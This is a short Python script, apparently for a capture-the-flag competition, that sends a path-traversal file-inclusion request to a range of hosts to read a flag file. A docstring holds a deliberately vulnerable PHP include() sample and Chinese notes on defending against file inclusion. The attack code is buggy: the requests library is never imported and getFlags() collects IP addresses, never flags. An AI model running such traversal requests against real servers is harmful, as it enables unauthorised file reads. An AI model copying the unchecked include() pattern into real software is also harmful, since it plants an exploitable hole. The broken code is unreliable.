#coding:utf-8

import re

from Gen_IP import gen_ip

ips = gen_ip("172.16.5.10-172.16.5.35")
black_ips = ["172.16.5.20", "172.16.5.30"]
flags = []

def include(host):
    r = requests.get(url="http://%s/?t=../../../../../../flag"%host)
    flags = re.findall(r'^(.+?)<',r.content)
    if flags:
        return flags[0]
    else:
        return "error pwn!"

def getFlags():
    for ip in ips:
        if ip not in black_ips:
            flags.append(ip)
            #print ip
    return flags
    print "Pwn!"


"""

<?php

$filename = $_GET['filename'];

include($filename);

?>

综合来说，文件包含漏洞的防范方案有：

　　1. 在代码层面

　　　 文件包含函数的文件名尽量避免动态变量，尤其是用户可以控制的变量；最好使用文件名白名单

　　2. 服务器配置方面

　　　　a. php.ini中open_basedir的值将允许包含的文件限定在某一特定目录内，这样可以有效避免利用文件包 含漏洞进行的攻击 {本地文件包含漏洞}

　　　　b. php.ini的配置选项allow_url_fopen和allow_url_include设置为Off （禁止打开远程文件，禁止包含远程文件）          {远程文件包含漏洞}

        c. open_basedir=/var/www/test/
    
    3. 过滤
    
       $sTemplatePath = str_replace(array(“.”,”\/”), “”, $sTemplatePath);
"""
